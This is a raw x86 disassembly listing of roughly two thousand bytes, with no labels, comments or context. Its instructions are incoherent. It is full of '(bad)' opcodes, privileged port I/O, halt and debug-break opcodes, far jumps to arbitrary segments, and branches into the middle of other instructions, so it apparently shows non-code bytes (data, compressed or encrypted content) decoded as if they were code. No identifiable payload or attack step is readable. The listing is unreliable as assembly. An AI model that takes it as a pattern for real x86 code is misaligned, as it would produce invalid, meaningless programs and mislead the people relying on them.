  403eda:	fiadd  DWORD PTR [edx-0x3b]
  403edd:	mov    al,cl
  403edf:	sbb    dh,BYTE PTR [edi+esi*8+0x0]
  403ee3:	lahf   
  403ee4:	pop    edx
  403ee5:	xor    DWORD PTR [ecx+ebp*8],0xffffffb1
  403ee9:	xchg   ebp,eax
  403eea:	mov    esi,0xc3bd7255
  403eef:	enter  0x3840,0xb
  403ef3:	cwde   
  403ef4:	out    dx,al
  403ef5:	aas    
  403ef6:	ins    BYTE PTR es:[edi],dx
  403ef7:	cwde   
  403ef8:	vpgatherdd ymm2,DWORD PTR [eax],ymm5
  403efd:	(bad)  
  403efe:	xchg   BYTE PTR [ebx-0x44],ch
  403f01:	inc    esi
  403f02:	sbb    esi,DWORD PTR [ecx-0x2561969c]
  403f08:	pusha  
  403f09:	pop    ecx
  403f0a:	loope  0x403eb7
  403f0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f0d:	iret   
  403f0e:	mov    ch,0xe0
  403f10:	mov    bh,0xca
  403f12:	daa    
  403f13:	ret    
  403f14:	pop    eax
  403f15:	jecxz  0x403f6a
  403f17:	aam    0xa9
  403f19:	ins    BYTE PTR es:[edi],dx
  403f1a:	xor    al,cl
  403f1c:	aas    
  403f1d:	nop
  403f1e:	outs   dx,DWORD PTR ds:[esi]
  403f1f:	addr16 pop esi
  403f21:	mov    BYTE PTR [esi],bh
  403f23:	pop    es
  403f24:	in     eax,0xf0
  403f26:	xor    esi,DWORD PTR ds:0x5d08ee5b
  403f2c:	mov    eax,0xad09a4a1
  403f31:	sbb    al,0xa5
  403f33:	aad    0x4f
  403f35:	adc    DWORD PTR [ecx+eiz*4],esp
  403f38:	mov    bl,0xd5
  403f3a:	sti    
  403f3b:	fwait
  403f3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f3d:	inc    esi
  403f3e:	or     ah,BYTE PTR [edi+edx*4]
  403f41:	xor    al,0x1c
  403f43:	addr16 inc esp
  403f45:	iret   
  403f46:	cmp    BYTE PTR [esp+ebx*8],0xa4
  403f4a:	mov    edi,eax
  403f4c:	mov    esi,0xcebe5eeb
  403f51:	push   eax
  403f52:	out    dx,al
  403f53:	push   0x60
  403f55:	pop    ecx
  403f56:	sub    bl,bh
  403f58:	div    DWORD PTR [esi+0x5a]
  403f5b:	mov    al,ds:0x1296c212
  403f60:	mov    cl,0x8c
  403f62:	xchg   edi,eax
  403f63:	and    ah,cl
  403f65:	lahf   
  403f66:	push   cs
  403f67:	in     eax,0x6e
  403f69:	mov    esp,DWORD PTR [edx+ecx*4-0x599ed7e1]
  403f70:	sbb    cl,ah
  403f72:	push   es
  403f73:	pushf  
  403f74:	xor    al,0x61
  403f76:	ss fwait
  403f78:	mov    ah,0x1e
  403f7a:	icebp  
  403f7b:	out    0xaf,al
  403f7d:	and    BYTE PTR [eax+0x4a0ab9b4],cl
  403f83:	ins    DWORD PTR es:[edi],dx
  403f84:	add    al,0x3c
  403f86:	mov    ch,0xcc
  403f88:	push   edi
  403f89:	cwde   
  403f8a:	je     0x403f3f
  403f8c:	ret    
  403f8d:	lss    ebx,FWORD PTR [ecx-0x7e1ba6d7]
  403f94:	mov    al,0xe9
  403f96:	scas   al,BYTE PTR es:[edi]
  403f97:	aas    
  403f98:	push   cs
  403f99:	test   al,0x6e
  403f9b:	pop    edi
  403f9c:	js     0x403fb1
  403f9e:	cld    
  403f9f:	fiadd  DWORD PTR [bx+di]
  403fa2:	mov    dl,0x9d
  403fa4:	out    dx,eax
  403fa5:	bnd jp 0x404000
  403fa8:	es push esi
  403faa:	fwait
  403fab:	mov    bl,0x78
  403fad:	xor    BYTE PTR [edi],al
  403faf:	hlt    
  403fb0:	dec    esi
  403fb1:	pop    ds
  403fb2:	in     eax,0x43
  403fb4:	call   FWORD PTR [edi]
  403fb6:	and    bl,al
  403fb8:	dec    ebx
  403fb9:	pop    edx
  403fba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fbb:	icebp  
  403fbc:	stc    
  403fbd:	sbb    DWORD PTR [edx+0x47],edx
  403fc0:	add    DWORD PTR [ebx+0x7784f80f],0x67ebccce
  403fca:	sub    DWORD PTR [edi],eax
  403fcc:	jo     0x403f6a
  403fce:	mov    ebx,0x7a6405af
  403fd3:	add    al,0x5e
  403fd5:	mov    WORD PTR [edi],?
  403fd7:	test   DWORD PTR [esi-0x283c60f8],ecx
  403fdd:	sbb    esi,DWORD PTR [eax-0x700f8824]
  403fe3:	and    BYTE PTR [ecx-0x42],bl
  403fe6:	push   esi
  403fe7:	daa    
  403fe8:	and    ecx,eax
  403fea:	inc    edi
  403feb:	fnstcw WORD PTR [edi+eax*1]
  403fee:	jns    0x403fc3
  403ff0:	mov    ecx,0x667a2ce5
  403ff5:	ins    DWORD PTR es:[edi],dx
  403ff6:	xchg   ebx,eax
  403ff7:	push   esp
  403ff8:	push   0x10
  403ffa:	sub    al,0xba
  403ffc:	push   esp
  403ffd:	retf   0xda5b
  404000:	sbb    bh,BYTE PTR [ebp-0x7d]
  404003:	das    
  404004:	in     eax,0x9b
  404006:	sbb    eax,0xd070a39c
  40400b:	leave  
  40400c:	imul   edi,DWORD PTR [ebx+0x3c],0x8c860832
  404013:	(bad)  
  404014:	(bad)  
  404015:	leave  
  404016:	aad    0x47
  404018:	adc    DWORD PTR [ecx+eax*1-0x32],esp
  40401c:	out    0x50,eax
  40401e:	cmp    DWORD PTR [esi],edx
  404020:	sub    eax,0xd1b53c7d
  404025:	shl    BYTE PTR [ebx],0x6b
  404028:	ja     0x403fba
  40402a:	or     bl,BYTE PTR [esi+0x4]
  40402d:	rcr    DWORD PTR [esi-0x7dd68442],cl
  404033:	jg     0x403fcc
  404035:	xlat   BYTE PTR ds:[ebx]
  404036:	ins    BYTE PTR es:[edi],dx
  404037:	lods   eax,DWORD PTR ds:[esi]
  404038:	rcl    BYTE PTR [ebx+ebp*2],0x80
  40403c:	xchg   esi,eax
  40403d:	push   cs
  40403e:	leave  
  40403f:	retf   0x58a0
  404042:	jmp    0xa181fbd3
  404047:	and    eax,0x820eafdc
  40404c:	or     esp,esi
  40404e:	(bad)  
  40404f:	xlat   BYTE PTR ds:[ebx]
  404050:	aad    0xe2
  404052:	adc    al,0x2b
  404054:	cli    
  404055:	out    dx,al
  404056:	mov    ds:0x88e5af85,eax
  40405b:	or     bh,dl
  40405d:	inc    ebp
  40405e:	and    ebx,edx
  404060:	retf   0xa9a8
  404063:	iret   
  404064:	mov    esp,es
  404066:	pop    edi
  404067:	out    0xd5,al
  404069:	(bad)  
  40406a:	ja     0x4040de
  40406c:	jb     0x40403a
  40406e:	cli    
  40406f:	pop    ecx
  404070:	sub    bl,cl
  404072:	jmp    0xdba39d84
  404077:	stc    
  404078:	lahf   
  404079:	loop   0x4040c5
  40407b:	jg     0x4040c3
  40407d:	add    eax,0xc3637fc3
  404082:	mov    bh,BYTE PTR [ecx]
  404084:	arpl   WORD PTR [edx],di
  404086:	and    DWORD PTR [ebp+0x481973ef],eax
  40408c:	dec    edx
  40408d:	dec    edi
  40408e:	pop    es
  40408f:	gs dec edi
  404091:	inc    eax
  404092:	imul   edi,DWORD PTR [eax+0x22c5abbc],0x17174d4
  40409c:	out    0x8,eax
  40409e:	xor    esp,DWORD PTR [ebp+0x34]
  4040a1:	out    0x3b,al
  4040a3:	or     eax,0x734e6890
  4040a8:	(bad)  
  4040a9:	sbb    al,0x98
  4040ab:	out    0x42,al
  4040ad:	loop   0x404076
  4040af:	inc    ebp
  4040b0:	dec    edi
  4040b1:	lock adc al,0xbd
  4040b4:	jp     0x404036
  4040b6:	dec    DWORD PTR [edi+0x1d]
  4040b9:	adc    al,0xb5
  4040bb:	pop    esi
  4040bc:	in     eax,dx
  4040bd:	in     al,0x74
  4040bf:	cmp    DWORD PTR [edi+0x3a],ecx
  4040c2:	iret   
  4040c3:	cmovg  ebp,DWORD PTR [eax+0x599f7f36]
  4040ca:	leave  
  4040cb:	and    BYTE PTR [ecx+0x22],dl
  4040ce:	test   DWORD PTR cs:[edi-0x23],ebp
  4040d2:	mov    dh,0x3e
  4040d4:	mov    ecx,DWORD PTR [ecx+ecx*8-0x78]
  4040d8:	aad    0x17
  4040da:	nop    DWORD PTR [ebp-0x686130d7]
  4040e1:	push   es
  4040e2:	fisttp QWORD PTR [ecx]
  4040e4:	in     al,0x67
  4040e6:	bound  ecx,QWORD PTR [edx+0x5ed22762]
  4040ec:	iret   
  4040ed:	out    0xb,eax
  4040ef:	enter  0x5d9e,0x82
  4040f3:	aad    0xf2
  4040f5:	inc    eax
  4040f6:	mov    eax,0xa78ae5
  4040fb:	mov    dh,0x6b
  4040fd:	nop
  4040fe:	lock call 0x425396b4
  404104:	and    eax,0xff1e5e3a
  404109:	call   0x4cc9:0xe78d17a3
  404110:	in     al,dx
  404111:	mov    bh,0x15
  404113:	push   0xb73e15e
  404118:	repz mov eax,ds:0xd87394b9
  40411e:	xchg   DWORD PTR [edi],ebx
  404120:	pop    esp
  404121:	mov    dl,0xfd
  404123:	mov    ch,0xef
  404125:	jnp    0x40419e
  404127:	add    DWORD PTR [eax+ebp*8],0xffffffd9
  40412b:	sub    BYTE PTR [edi],cl
  40412d:	fistp  QWORD PTR [ebx]
  40412f:	jae    0x40411b
  404131:	sbb    ecx,DWORD PTR [edx-0x4b223d4d]
  404137:	xlat   BYTE PTR ds:[ebx]
  404138:	aam    0xfa
  40413a:	test   BYTE PTR [ebx],dl
  40413c:	out    0x89,al
  40413e:	pop    edx
  40413f:	jmp    0x4041b8
  404141:	clc    
  404142:	aam    0x2e
  404144:	mov    BYTE PTR [esi],dl
  404146:	mov    ah,0x38
  404148:	or     eax,0x4227cb3f
  40414d:	jg     0x404113
  40414f:	xchg   edi,eax
  404150:	push   ecx
  404151:	shr    DWORD PTR [esi+0x178c6490],1
  404157:	jne    0x404141
  404159:	addr16 mov dl,0x3c
  40415c:	add    DWORD PTR [ebx+0x7d],edx
  40415f:	les    esi,FWORD PTR [esi]
  404161:	sub    eax,0xc50bd0ee
  404166:	dec    edi
  404167:	test   DWORD PTR [ecx],0xc284e3a1
  40416d:	or     ebp,DWORD PTR [ebx-0x72]
  404170:	push   0xffffffe6
  404172:	adc    al,0x9a
  404174:	add    DWORD PTR [ecx+0x7d],0xffffffea
  404178:	mov    esi,0xb4cd0dc6
  40417d:	jmp    FWORD PTR [edi]
  40417f:	or     esp,DWORD PTR [edx+0xb588509]
  404185:	dec    ebp
  404186:	jb     0x404108
  404188:	rol    DWORD PTR [ebp+0x72],1
  40418b:	xchg   ebx,eax
  40418c:	jecxz  0x4041a9
  40418e:	les    esp,FWORD PTR [edx-0x34]
  404191:	mov    cl,0x86
  404193:	addr16 sbb eax,0x980af206
  404199:	add    ch,0xa
  40419c:	mov    ecx,DWORD PTR [edx]
  40419e:	xor    ebp,edi
  4041a0:	(bad)  
  4041a1:	cmp    al,0xcb
  4041a3:	loope  0x404213
  4041a5:	sbb    al,0x1b
  4041a7:	mov    ds:0xd2f08ad8,al
  4041ac:	in     al,dx
  4041ad:	iret   
  4041ae:	fstp   DWORD PTR [ebp-0x785ca260]
  4041b4:	loope  0x40415e
  4041b6:	ret    0x4314
  4041b9:	int3   
  4041ba:	sbb    DWORD PTR ds:0xcd486c78,edi
  4041c0:	add    al,0xab
  4041c2:	pusha  
  4041c3:	pop    eax
  4041c4:	ss mov dl,0xc5
  4041c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041c8:	(bad)  
  4041c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041ca:	mov    bl,0x2f
  4041cc:	loope  0x404203
  4041ce:	std    
  4041cf:	fdivr  DWORD PTR cs:[ecx]
  4041d2:	xchg   ebx,eax
  4041d3:	cli    
  4041d4:	mov    bl,BYTE PTR [edi+0x18]
  4041d7:	xchg   ebp,eax
  4041d8:	rol    DWORD PTR cs:[ecx],0xa1
  4041dc:	mov    eax,eax
  4041de:	call   0x7b22:0xc7d61dfc
  4041e5:	in     eax,dx
  4041e6:	retf   0xb1ce
  4041e9:	ds jbe 0x40420a
  4041ec:	pushf  
  4041ed:	jnp    0x40426e
  4041ef:	retf   
  4041f0:	adc    esi,DWORD PTR [eax]
  4041f2:	int3   
  4041f3:	cwde   
  4041f4:	adc    bl,BYTE PTR [esi]
  4041f6:	pop    ss
  4041f7:	test   eax,0x6a6c0fdc
  4041fc:	mov    ebp,0x12fbe912
  404201:	inc    ecx
  404202:	jns    0x40421f
  404204:	xor    BYTE PTR [ecx],ah
  404206:	cmc    
  404207:	xor    BYTE PTR [edi+0x52],ah
  40420a:	push   0xffffff8c
  40420c:	repz popa 
  40420e:	out    dx,eax
  40420f:	inc    esi
  404210:	xchg   edi,eax
  404211:	sbb    esp,DWORD PTR [esi+0x4e617900]
  404217:	xchg   ebp,eax
  404218:	fcomp  st(1)
  40421a:	out    0x94,al
  40421c:	push   edi
  40421d:	sti    
  40421e:	or     BYTE PTR [eax],bh
  404220:	outs   dx,BYTE PTR ds:[esi]
  404221:	bound  eax,QWORD PTR ds:0xff26f556
  404227:	adc    ch,cl
  404229:	xchg   edi,eax
  40422a:	div    ch
  40422c:	cmc    
  40422d:	mov    eax,ds:0x3772a644
  404232:	inc    edi
  404233:	rcl    DWORD PTR [ebx-0x4f],0x1c
  404237:	test   BYTE PTR ds:0x51fd4e8b,cl
  40423d:	xor    esi,edi
  40423f:	sub    BYTE PTR [ecx],0x76
  404242:	push   edi
  404243:	lods   al,BYTE PTR ds:[esi]
  404244:	mov    dl,0x28
  404246:	xor    DWORD PTR [edi+0x5b48739],esp
  40424c:	lods   al,BYTE PTR ds:[esi]
  40424d:	pop    ebp
  40424e:	rcl    BYTE PTR [edi],cl
  404250:	mov    ebp,?
  404252:	sub    eax,0xf174e774
  404257:	sti    
  404258:	retf   0xe310
  40425b:	dec    edx
  40425c:	dec    ebp
  40425d:	out    0x47,al
  40425f:	dec    ebx
  404260:	mov    ds:0x90fc999d,al
  404265:	xor    eax,esi
  404267:	ficom  DWORD PTR [eax-0x196b2f82]
  40426d:	jmp    0xe25:0xc1cbb8bd
  404274:	ds push ebx
  404276:	xor    eax,0x3ff1aa7f
  40427b:	fucom  st(5)
  40427d:	pop    edi
  40427e:	in     al,0xe7
  404280:	dec    edi
  404281:	ret    0xd9df
  404284:	xor    eax,0x45bced0b
  404289:	pushf  
  40428a:	into   
  40428b:	push   0xfffffff6
  40428d:	jl     0x4042dc
  40428f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404290:	xchg   DWORD PTR [ebx+0x27504f60],ebp
  404296:	addr16 jae 0x404305
  404299:	ds jno 0x404280
  40429c:	rcl    DWORD PTR [ebp+0x6584f78f],cl
  4042a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042a3:	and    al,0x12
  4042a5:	stc    
  4042a6:	sti    
  4042a7:	mov    ds:0xa4481d75,al
  4042ac:	mov    edx,0x96a3a72a
  4042b1:	mov    BYTE PTR [edx+0x4d209d30],dh
  4042b7:	and    edx,DWORD PTR [esp+edi*4]
  4042ba:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042bc:	hlt    
  4042bd:	in     eax,dx
  4042be:	cs xchg esp,eax
  4042c0:	lds    ecx,FWORD PTR [ecx]
  4042c2:	out    0x4e,al
  4042c4:	cli    
  4042c5:	pop    esi
  4042c6:	ja     0x404316
  4042c8:	mov    dl,0x57
  4042ca:	mov    ebp,0x954bf276
  4042cf:	pop    ss
  4042d0:	push   cs
  4042d1:	mov    ch,0x71
  4042d3:	sub    ch,BYTE PTR [ebx]
  4042d5:	adc    BYTE PTR [ebx],0x9b
  4042d8:	adc    al,0x73
  4042da:	pushf  
  4042db:	fwait
  4042dc:	loope  0x4042b3
  4042de:	mov    ds:0xc61b9067,eax
  4042e3:	push   ebx
  4042e4:	(bad)  
  4042e6:	fisttp WORD PTR [ebp-0x61e62a43]
  4042ec:	cld    
  4042ed:	cmp    edx,esp
  4042ef:	lods   eax,DWORD PTR ds:[esi]
  4042f0:	in     eax,0x3
  4042f2:	sbb    al,0x83
  4042f4:	jno    0x404372
  4042f6:	inc    ebx
  4042f7:	pop    edx
  4042f8:	cmp    al,0x7b
  4042fa:	push   cs
  4042fb:	nop
  4042fc:	and    eax,0xce61b06
  404301:	sub    bl,dh
  404303:	rcl    BYTE PTR [esi+eax*1+0x544275b],cl
  40430a:	sar    dh,cl
  40430c:	or     DWORD PTR [ebp-0x6f746ad2],ecx
  404312:	xor    esp,DWORD PTR [esi*4+0x45ee0edc]
  404319:	scas   eax,DWORD PTR es:[edi]
  40431a:	sbb    ch,BYTE PTR [esi+ebx*4]
  40431d:	mov    eax,0x7fecea70
  404322:	je     0x4042b8
  404324:	mov    ds:0xbc4148e,al
  404329:	scas   eax,DWORD PTR es:[edi]
  40432a:	inc    esi
  40432b:	lds    esi,FWORD PTR [ecx]
  40432d:	mov    bh,0xb9
  40432f:	jl     0x40435b
  404331:	retf   
  404332:	mov    ch,0xf2
  404334:	mov    bl,0xba
  404336:	and    al,0x3d
  404338:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404339:	inc    edi
  40433a:	add    ecx,DWORD PTR [edx]
  40433c:	push   ebp
  40433d:	sti    
  40433e:	add    DWORD PTR [eax],0xe12f7d4f
  404344:	arpl   cx,si
  404346:	pop    ebp
  404347:	inc    eax
  404348:	std    
  404349:	add    ebx,DWORD PTR [ebx+0x74]
  40434c:	(bad)  
  40434d:	xor    al,0x7e
  40434f:	arpl   si,cx
  404351:	mov    dh,0x4
  404353:	fwait
  404354:	stc    
  404355:	sbb    DWORD PTR [ecx+ebx*2+0x60eaffb8],esp
  40435c:	fwait
  40435d:	data16 mov dh,BYTE PTR [esi+ecx*4+0x1a15ed1e]
  404365:	sub    DWORD PTR [edx-0x5e],ecx
  404368:	dec    ecx
  404369:	mov    ecx,0xf42ee26e
  40436e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40436f:	mov    esi,0xba38873b
  404374:	sbb    al,0xb3
  404376:	je     0x404327
  404378:	dec    edi
  404379:	pushf  
  40437a:	mov    dh,0x0
  40437c:	adc    eax,0xd21a19e
  404381:	outs   dx,BYTE PTR ds:[esi]
  404382:	retf   
  404383:	add    DWORD PTR [ecx+eax*2],0x3
  404387:	push   ds
  404388:	pop    ss
  404389:	add    edx,DWORD PTR [esi]
  40438b:	sub    al,0x30
  40438d:	mov    dh,0x9c
  40438f:	cmp    ebp,esi
  404391:	out    dx,eax
  404392:	mov    ch,0x12
  404394:	mov    ch,0x5a
  404396:	pop    ss
  404397:	sbb    edi,esi
  404399:	adc    DWORD PTR [esi-0x176eda92],edi
  40439f:	pop    ecx
  4043a0:	dec    edi
  4043a1:	jle    0x404405
  4043a3:	and    al,0x75
  4043a5:	imul   ecx,ebp,0xb683fa12
  4043ab:	xchg   esi,eax
  4043ac:	jo     0x4043de
  4043ae:	call   0xae3dad91
  4043b3:	sub    eax,0xf232d49b
  4043b8:	push   ds
  4043b9:	dec    edx
  4043ba:	jl     0x404394
  4043bc:	cld    
  4043bd:	aad    0x62
  4043bf:	jmp    0x3953:0xb98cd660
  4043c6:	dec    edx
  4043c7:	jnp    0x4043c8
  4043c9:	addr16 cmp al,0xd9
  4043cc:	mov    ds:0xc2cbc08d,eax
  4043d1:	adc    dl,BYTE PTR [ebp+0xd8d3e44]
  4043d7:	mov    ecx,0xfd0beb3b
  4043dc:	xor    eax,0x19fd25c1
  4043e1:	adc    DWORD PTR ds:0x4df73eb3,esp
  4043e7:	jmp    0x4140:0x7c0731e0
  4043ee:	jo     0x4043c1
  4043f0:	pop    esp
  4043f1:	mov    bl,0x19
  4043f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043f4:	std    
  4043f5:	mov    dl,0xc6
  4043f7:	rcl    DWORD PTR [eax],cl
  4043f9:	pop    ebp
  4043fa:	xor    al,BYTE PTR [eax-0x7e285577]
  404400:	add    eax,0x67ac98bf
  404405:	arpl   WORD PTR [ecx+0x2c6420e2],bx
  40440b:	jae    0x404452
  40440d:	dec    eax
  40440e:	push   ebx
  40440f:	dec    ebx
  404410:	add    BYTE PTR [ebp+0x79f49a12],bh
  404416:	cmp    DWORD PTR [ecx],ebp
  404418:	cld    
  404419:	add    BYTE PTR [ebp+0x66e66c12],ah
  40441f:	test   eax,0x5aff4cd4
  404424:	ret    
  404425:	mov    esp,0xf063a0b6
  40442a:	mov    ds:0x41fd9152,eax
  40442f:	int3   
  404430:	inc    ecx
  404431:	inc    ecx
  404432:	sub    DWORD PTR [edx-0x6400b4ff],0x50
  404439:	scas   al,BYTE PTR es:[edi]
  40443a:	mov    ah,0x77
  40443c:	not    BYTE PTR [edi+0x3f]
  40443f:	ret    
  404440:	adc    ah,dl
  404442:	mov    ds:0x3bf79c9f,eax
  404447:	(bad)  
  404448:	xchg   edi,eax
  404449:	ret    
  40444a:	sub    ah,dl
  40444c:	les    ebx,FWORD PTR [ebx]
  40444e:	sbb    DWORD PTR [edx-0x6938d94c],esp
  404454:	push   ebx
  404455:	imul   esp,DWORD PTR ss:[esi+0x33],0xffffffb5
  40445a:	and    BYTE PTR [ebp-0x3a2a3df2],ah
  404460:	test   BYTE PTR [eax],cl
  404462:	inc    ebx
  404463:	test   BYTE PTR [esi+0x522e48bc],bl
  404469:	lock test DWORD PTR [edx+edx*1-0x47],ebp
  40446e:	sti    
  40446f:	or     eax,0x41323e51
  404474:	lods   eax,DWORD PTR ds:[esi]
  404475:	jae    0x4044a7
  404477:	call   0x584c:0x94196947
  40447e:	jb     0x4044cc
  404480:	lods   al,BYTE PTR ds:[esi]
  404481:	push   0xf833a97f
  404486:	nop
  404487:	lds    edi,FWORD PTR [ebx+0x22]
  40448a:	aas    
  40448b:	cmp    ah,ah
  40448d:	dec    esi
  40448e:	pop    ecx
  40448f:	pop    ecx
  404490:	dec    edx
  404491:	test   eax,0x7794cf12
  404496:	push   eax
  404497:	and    dl,BYTE PTR [ebx-0x747494b8]
  40449d:	int3   
  40449e:	aad    0xa1
  4044a0:	mov    BYTE PTR fs:[eax+0x25a778f1],al
  4044a7:	adc    edi,DWORD PTR [esi-0x69]
  4044aa:	(bad)  
  4044ab:	fldcw  WORD PTR [esi+0x4e]
  4044ae:	mov    BYTE PTR [esi+0x19a522b8],dh
  4044b4:	jne    0x40444f
  4044b6:	sub    eax,0x8705f5f1
  4044bb:	iret   
  4044bc:	adc    edx,DWORD PTR [ebx+0x2d]
  4044bf:	add    al,BYTE PTR [edx+eiz*8-0x73]
  4044c3:	ret    0xf172
  4044c6:	and    edi,DWORD PTR [edi]
  4044c8:	or     ecx,DWORD PTR [eax]
  4044ca:	sbb    al,0x49
  4044cc:	and    ch,bh
  4044ce:	and    cl,BYTE PTR [ebx]
  4044d0:	push   esp
  4044d1:	adc    DWORD PTR [ecx-0x41],edx
  4044d4:	inc    esp
  4044d5:	out    0x2f,eax
  4044d7:	(bad)  
  4044d8:	xor    al,0x19
  4044da:	jnp    0x404558
  4044dc:	outs   dx,BYTE PTR ds:[esi]
  4044dd:	adc    DWORD PTR [edi+0x3993fcb8],ebx
  4044e3:	bound  ecx,QWORD PTR [eax-0xb]
  4044e6:	es xchg ecx,eax
  4044e8:	mov    ecx,0xc02b26de
  4044ed:	lods   al,BYTE PTR ds:[esi]
  4044ee:	and    edi,DWORD PTR [ebx-0xdc02665]
  4044f4:	push   ds
  4044f5:	inc    edx
  4044f6:	xor    eax,DWORD PTR [ecx+0x2b]
  4044f9:	xchg   edi,eax
  4044fa:	pop    eax
  4044fb:	pop    ebp
  4044fc:	pop    esi
  4044fd:	cld    
  4044fe:	xchg   ebx,eax
  4044ff:	dec    esi
  404500:	ds in  al,0x5d
  404503:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404504:	jns    0x404515
  404506:	and    eax,0x9a192655
  40450b:	arpl   WORD PTR [esi-0x7cc85d59],cx
  404511:	and    eax,0x76aa8b39
  404516:	mov    edi,0x38794fbe
  40451b:	in     al,dx
  40451c:	cmp    eax,0xf1f2d1d7
  404521:	dec    ebx
  404522:	or     al,0xe
  404524:	imul   edi,DWORD PTR [ebp-0x55ed7ef8],0x55
  40452b:	rcl    edx,1
  40452d:	ret    
  40452e:	fdiv   DWORD PTR [edi]
  404530:	sub    BYTE PTR [edx+0x51],ah
  404533:	mov    ebx,0x94beff69
  404538:	lahf   
  404539:	and    al,0x8e
  40453b:	sbb    edi,eax
  40453d:	push   ss
  40453e:	inc    ebp
  40453f:	xor    BYTE PTR [ebp+eiz*8+0x25],dh
  404543:	(bad)  
  404546:	jl     0x4044cb
  404548:	inc    edi
  404549:	stos   DWORD PTR es:[edi],eax
  40454a:	sbb    eax,0xb23f6eea
  40454f:	adc    eax,0xc69ead6e
  404554:	int    0x96
  404556:	xor    bh,BYTE PTR [edi+eax*1]
  404559:	mov    eax,ds:0x2ccea735
  40455e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40455f:	jbe    0x404557
  404561:	aaa    
  404562:	fs mov dl,0xd7
  404565:	mov    eax,ds:0xc4cea84b
  40456a:	push   ebp
  40456b:	and    ecx,ebp
  40456d:	dec    esi
  40456e:	xor    eax,0x7d3ed01d
  404573:	dec    ebx
  404574:	test   DWORD PTR [esi-0x6f2842e6],0x4faeca77
  40457e:	sub    DWORD PTR [ecx-0x3eb53533],0xecb8b6ae
  404588:	add    dl,BYTE PTR [ecx+0x7b]
  40458b:	in     al,dx
  40458c:	push   esp
  40458d:	sbb    al,0x11
  40458f:	fadd   DWORD PTR [ecx-0x72ce9cea]
  404595:	loopne 0x40456e
  404597:	pop    esi
  404598:	inc    esi
  404599:	in     al,dx
  40459a:	jg     0x4045b1
  40459c:	cdq    
  40459d:	test   edx,edi
  40459f:	in     al,0x84
  4045a1:	shr    DWORD PTR [eax],cl
  4045a3:	fistp  QWORD PTR [edx+0x6a]
  4045a6:	sbb    DWORD PTR [eax+0x17],edi
  4045a9:	scas   eax,DWORD PTR es:[edi]
  4045aa:	leave  
  4045ab:	push   0xbe3d8a2d
  4045b0:	pop    ss
  4045b1:	jns    0x40454a
  4045b3:	mov    WORD PTR [ebp+0x23d41599],ds
  4045b9:	jp     0x40457d
  4045bb:	fcom   QWORD PTR [eax-0x81e4d75]
  4045c1:	mov    bl,0xca
  4045c3:	fistp  WORD PTR [eax]
  4045c5:	(bad)  
  4045c6:	adc    BYTE PTR [esi],0x92
  4045c9:	daa    
  4045ca:	in     al,0xe7
  4045cc:	imul   esi,DWORD PTR [ebp+0x6b],0x5ff6ec10
  4045d3:	jle    0x404588
  4045d5:	mov    ecx,0xe9a944a6
  4045da:	xchg   edx,eax
  4045db:	xchg   ebx,eax
  4045dc:	test   ebp,edi
  4045de:	adc    eax,0x1436bfee
  4045e3:	std    
  4045e4:	pushf  
  4045e5:	adc    al,0xd5
  4045e7:	add    bh,bl
  4045e9:	rep lods al,BYTE PTR ds:[esi]
  4045eb:	fadd   QWORD PTR [edi]
  4045ed:	sti    
  4045ee:	imul   eax,DWORD PTR [eax-0x1148336d],0xffffffe9
  4045f5:	repz (bad) 
  4045f7:	scas   al,BYTE PTR es:[edi]
  4045f8:	cmc    
  4045f9:	lods   eax,DWORD PTR ds:[esi]
  4045fa:	jae    0x4045db
  4045fc:	and    DWORD PTR [esi],0x3e390393
  404602:	stc    
  404603:	mul    BYTE PTR [edx-0x7aa0ed4f]
  404609:	inc    eax
  40460a:	lods   al,BYTE PTR ds:[esi]
  40460b:	js     0x4045c7
  40460d:	(bad)  
  40460e:	sahf   
  40460f:	daa    
  404610:	xor    al,0x5b
  404612:	push   esi
  404613:	(bad)  
  404614:	fidivr DWORD PTR [ebp+0x5bfb5cf5]
  40461a:	rol    BYTE PTR [eax+0x4e43105a],cl
  404620:	mov    al,0x88
  404622:	mov    cl,ch
  404624:	outs   dx,DWORD PTR ds:[esi]
  404625:	data16 cli 
  404627:	sbb    ch,cl
  404629:	sbb    edi,DWORD PTR [ebp+0x3a2584f9]
  40462f:	or     edi,esp
  404631:	and    ecx,eax
  404633:	test   eax,0xabc80ca3
  404638:	ret    
  404639:	push   ds
  40463a:	mov    eax,0x8431d6c2
  40463f:	sub    ah,dl
  404641:	mov    ax,0x482e
  404645:	mov    ds:0x64763431,al
  40464a:	nop
  40464b:	sti    
  40464c:	and    eax,0xb305306f
  404651:	popa   
  404652:	outs   dx,DWORD PTR ds:[esi]
  404653:	xor    al,BYTE PTR [edi]
  404655:	test   al,0x1f
  404657:	out    0x7a,al
  404659:	aam    0x9
  40465b:	sub    DWORD PTR [eax+0x25],esp
  40465e:	stos   DWORD PTR es:[edi],eax
  40465f:	add    eax,DWORD PTR [edi+eax*4+0x760dc3f0]
  404666:	mov    ds:0x8ad71f5c,al
  40466b:	aam    0x80
  40466d:	imul   edx,DWORD PTR [edi-0x3a],0x24
  404671:	jbe    0x4046c5
  404673:	adc    eax,DWORD PTR [edi+ebp*8]
  404676:	rcr    DWORD PTR [edx-0x2f],cl
  404679:	std    
  40467a:	push   eax
  40467b:	fmul   DWORD PTR [edx-0x22935f8f]
  404681:	adc    BYTE PTR [eax],cl
  404683:	adc    edx,esp
  404685:	out    dx,al
  404686:	mov    ah,0xb
  404688:	push   ecx
  404689:	xor    esi,edx
  40468b:	stc    
  40468c:	inc    esi
  40468d:	push   esi
  40468e:	leave  
  40468f:	xor    al,0x76
  404691:	call   0x37429a04
  404696:	not    BYTE PTR ds:0x1186837e
  40469c:	popa   
  40469d:	cmp    al,0xd6
  40469f:	pop    ds
  4046a0:	cld    
  4046a1:	adc    cl,ch
  4046a3:	inc    ebp
